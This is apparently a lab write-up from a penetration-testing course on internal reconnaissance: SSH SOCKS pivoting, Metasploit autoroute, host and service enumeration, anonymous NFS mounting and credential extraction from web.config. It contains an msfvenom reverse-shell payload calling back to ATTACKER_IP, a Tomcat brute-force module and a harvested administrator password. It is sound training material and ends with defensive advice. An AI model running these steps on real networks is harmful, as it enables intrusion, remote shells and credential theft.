# Internal Information Gathering

## 🎯 Overview

**Internal Information Gathering** transforms **external foothold** into **comprehensive internal reconnaissance**. Establish **SSH/Metasploit pivoting**, discover **live hosts**, enumerate **Active Directory infrastructure**, and exploit **misconfigured services** for credential harvesting and lateral movement preparation.

## 🔄 Pivoting Setup Methods

### 🔑 SSH Dynamic Port Forwarding
```bash
# Establish SSH SOCKS proxy
ssh -D 8081 -i dmz01_key root@TARGET_IP

# Verify tunnel establishment
netstat -antp | grep 8081
# Output: tcp 0 0 127.0.0.1:8081 0.0.0.0:* LISTEN 122808/ssh

# ProxyChains configuration
echo "socks4 127.0.0.1 8081" >> /etc/proxychains.conf

# Test connectivity
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

### 🎯 Metasploit Autoroute Alternative
```bash
# 1. Generate Meterpreter payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf > shell.elf

# 2. Transfer to target
scp -i dmz01_key shell.elf root@TARGET_IP:/tmp

# 3. Setup multi/handler
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 443
exploit

# 4. Execute payload on target
chmod +x shell.elf && ./shell.elf

# 5. Setup autoroute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.8.0
run
```

## 🔍 Internal Host Discovery

### 📊 Network Scanning Approaches
```bash
# Method 1: Bash ping sweep (from pivot host)
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
# Results:
64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms    # Domain Controller
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms   # Windows + NFS
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms   # Windows + Tomcat
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms   # DMZ host

# Method 2: Metasploit ping sweep
use post/multi/gather/ping_sweep
set RHOSTS 172.16.8.0/23
set SESSION 1
run

# Method 3: ProxyChains Nmap (slow but comprehensive)
proxychains nmap -sn 172.16.8.0/23
```

### 🎯 Discovered Infrastructure
```cmd
# Network topology mapping:
172.16.8.3   - Domain Controller (DNS, Kerberos, LDAP, SMB)
172.16.8.20  - Windows Server (HTTP, NFS, RDP)  
172.16.8.50  - Windows Server (SMB, RDP, Tomcat 8080)
172.16.8.120 - DMZ Host (current position)

# Service prioritization:
High: NFS (172.16.8.20) - potential credential exposure
Medium: Tomcat (172.16.8.50) - brute force target
Low: Domain Controller (172.16.8.3) - hardened target
```

## 🔍 Service Enumeration Results

### 📊 172.16.8.3 - Domain Controller Analysis
```bash
# Port enumeration:
53/tcp   open  domain      # DNS
88/tcp   open  kerberos    # Kerberos authentication
135/tcp  open  epmap       # RPC endpoint mapper
139/tcp  open  netbios-ssn # NetBIOS session service
389/tcp  open  ldap        # LDAP
445/tcp  open  microsoft-ds # SMB
464/tcp  open  kpasswd     # Kerberos password change
593/tcp  open  unknown     # RPC over HTTP
636/tcp  open  ldaps       # LDAP over SSL

# SMB NULL session attempt:
proxychains enum4linux -U -P 172.16.8.3
# Result: NT_STATUS_ACCESS_DENIED (hardened configuration)
# Domain identified: INLANEFREIGHT
# Domain SID: S-1-5-21-2814148634-3729814499-1637837074
```

### 🖥️ 172.16.8.50 - Tomcat Server Analysis
```bash
# Port enumeration:
135/tcp  open  epmap       # RPC endpoint mapper
139/tcp  open  netbios-ssn # NetBIOS session service
445/tcp  open  microsoft-ds # SMB
3389/tcp open  ms-wbt-server # RDP
8080/tcp open  http-alt     # Tomcat

# Tomcat Manager brute force attempt:
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 172.16.8.50
set STOP_ON_SUCCESS true
run
# Result: No successful authentication (hardened)
```

### 🌐 172.16.8.20 - Windows Server + NFS
```bash
# Port enumeration:
80/tcp   open  http        # DotNetNuke (DNN)
111/tcp  open  sunrpc      # RPC port mapper
135/tcp  open  epmap       # RPC endpoint mapper
139/tcp  open  netbios-ssn # NetBIOS session service
445/tcp  open  microsoft-ds # SMB
2049/tcp open  nfs         # Network File System
3389/tcp open  ms-wbt-server # RDP

# NFS share discovery:
proxychains showmount -e 172.16.8.20
# Result: /DEV01 (everyone) - anonymous access enabled
```

## 📁 NFS Share Exploitation

### 🔍 NFS Misconfiguration Assessment
```bash
# NFS export enumeration
showmount -e 172.16.8.20
# Output: Export list for 172.16.8.20: /DEV01 (everyone)

# Mount NFS share (from pivot host)
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01

# Share content analysis
ls -la /tmp/DEV01/
# Discovered:
BuildPackages.bat
CKToolbarButtons.xml  
DNN/                    # DotNetNuke directory
WatchersNET.CKEditor.sln
```

### 🔐 Credential Discovery in Config Files
```bash
# DNN configuration analysis
cd /tmp/DEV01/DNN/
ls -la

# Key files discovered:
web.config              # Primary configuration
web.Debug.config        # Debug configuration  
web.Deploy.config       # Deployment configuration
web.Release.config      # Release configuration

# Credential extraction from web.config:
cat web.config
# Discovered credentials:
<username>Administrator</username>
<password>
    <value>D0tn31Nuk3R0ck$$@123</value>
</password>
```

## 🌐 DotNetNuke (DNN) Analysis

### 📊 Application Assessment
```bash
# DNN installation discovery
proxychains curl http://172.16.8.20
# Result: DNN installation page

# Admin login page access
http://172.16.8.20/Login?returnurl=%2fadmin

# User registration attempt:
# Result: "Email sent to Site Administrator for verification"
# Assessment: Manual approval required (unlikely to succeed)

# Credential validation:
Administrator:D0tn31Nuk3R0ck$$@123
# Source: NFS share web.config file
```

### 🔍 Firefox SOCKS Proxy Configuration
```cmd
# Firefox proxy setup:
1. Settings → General → Network Settings
2. Manual proxy configuration
3. SOCKS Host: 127.0.0.1
4. Port: 8081
5. SOCKS v5 selected
6. Proxy DNS when using SOCKS v5: enabled

# Direct internal network access:
http://172.16.8.20 → DNN installation page
http://172.16.8.20/Login → Admin authentication portal
```

## 📡 Network Traffic Analysis

### 🔍 Packet Capture Setup
```bash
# Traffic monitoring from pivot host
tcpdump -i ens192 -s 65535 -w ilfreight_pcap

# Capture statistics:
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel

# Analysis workflow:
1. Transfer PCAP to attack host
2. Open in Wireshark for analysis
3. Search for cleartext credentials
4. Identify additional services/hosts
5. Map network communication patterns
```

### 📊 Network Intelligence Gathering
```bash
# Routing table analysis
ip route
# DNS configuration
cat /etc/resolv.conf
# ARP table enumeration
arp -a
# Network interface details
ifconfig -a
# Active connections
netstat -antup
```

## 🎯 Attack Surface Assessment

### 🔴 High-Priority Targets
```cmd
# 172.16.8.20 (DEV01):
- DNN installation (potential admin access)
- NFS misconfiguration (credential exposure)
- Development environment (likely less hardened)
- Web.config credentials discovered

# 172.16.8.3 (Domain Controller):
- Active Directory services
- Kerberos authentication
- LDAP directory services
- SMB hardened (NULL session denied)

# 172.16.8.50 (Windows Server):
- Tomcat 10 installation
- RDP services available
- SMB services present
- Authentication hardened
```

### 🟡 Secondary Targets
```cmd
# Additional reconnaissance opportunities:
- Full TCP port scans on discovered hosts
- UDP service discovery
- SMB share enumeration (authenticated)
- Web application directory brute forcing
- Service version vulnerability research
```

## 🛠️ Tools & Techniques Summary

### 🔄 Pivoting Methods
```bash
# SSH dynamic port forwarding:
ssh -D PORT -i private_key user@target

# Metasploit autoroute:
post/multi/manage/autoroute → automatic route discovery

# ProxyChains integration:
proxychains [command] → tunnel through established SOCKS proxy
```

### 🔍 Discovery Techniques
```bash
# Host discovery:
- Bash ping sweep (fast, efficient)
- Metasploit ping_sweep module
- Nmap through ProxyChains (slow but comprehensive)

# Service enumeration:
- Static Nmap binary on pivot host
- ProxyChains Nmap from attack host
- Metasploit auxiliary modules

# Credential hunting:
- NFS share mounting and analysis
- Configuration file examination
- Network traffic capture and analysis
```

## 🎯 HTB Academy Lab

### 📋 Lab Solution Summary
```cmd
# Internal reconnaissance chain:
1. SSH pivot setup → Dynamic port forwarding (8081)
2. ProxyChains configuration → SOCKS proxy integration
3. Host discovery → Bash ping sweep identification
4. Service enumeration → Nmap through pivot
5. NFS exploitation → Anonymous share mounting
6. Credential discovery → web.config analysis
7. Flag retrieval → /DEV01/flag.txt

# Key techniques demonstrated:
- Professional pivoting methodologies
- NFS share exploitation techniques
- Configuration file credential mining
- Internal network reconnaissance
```

### 🔍 Learning Objectives
```cmd
# Technical skills:
- SSH dynamic port forwarding setup
- ProxyChains configuration and usage
- NFS share mounting and enumeration
- Configuration file analysis techniques

# Professional methodology:
- Systematic internal reconnaissance
- Service prioritization strategies
- Evidence collection standards
- Network topology mapping

# Real-world application:
- Enterprise network pivoting
- Development environment exploitation
- Credential hunting in file shares
- Active Directory preparation
```

## 🛡️ Defensive Recommendations

### 🔒 Network Security
```cmd
# Network segmentation:
- Implement proper DMZ isolation
- Restrict internal network access
- Deploy network access controls
- Monitor east-west traffic

# Service hardening:
- Disable unnecessary NFS exports
- Implement NFS access controls
- Secure configuration file storage
- Regular credential rotation

# Monitoring and detection:
- Network traffic analysis
- Unusual connection monitoring
- Privilege escalation detection
- File access auditing
``` 